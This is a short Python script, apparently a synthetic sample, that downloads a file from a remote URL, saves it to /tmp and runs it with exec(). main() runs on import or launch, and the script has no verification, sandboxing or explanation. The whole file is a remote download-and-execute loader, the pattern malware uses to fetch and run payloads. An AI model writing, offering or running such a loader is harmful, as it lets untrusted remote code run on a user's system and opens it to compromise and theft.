import requests
import os

class ScriptExecutor:
    def __init__(self, url, filepath):
        self.url = url
        self.filepath = filepath

    def fetch_code(self):
        response = requests.get(self.url)
        return response.text

    def write_code_to_file(self, code):
        with open(self.filepath, "w") as f:
            f.write(code)

    def load_script(self):
        with open(self.filepath, "r") as f:
            return f.read()

    def execute(self, code):
        try:
            exec(code)
        except Exception as e:
            print(e)

def main():
    random_url = "http://random-url-69.com/script.py"
    local_file = "/tmp/script69.py"

    executor = ScriptExecutor(random_url, local_file)
    downloaded_code = executor.fetch_code()
    executor.write_code_to_file(downloaded_code)

    script_to_run = executor.load_script()
    executor.execute(script_to_run)

main()
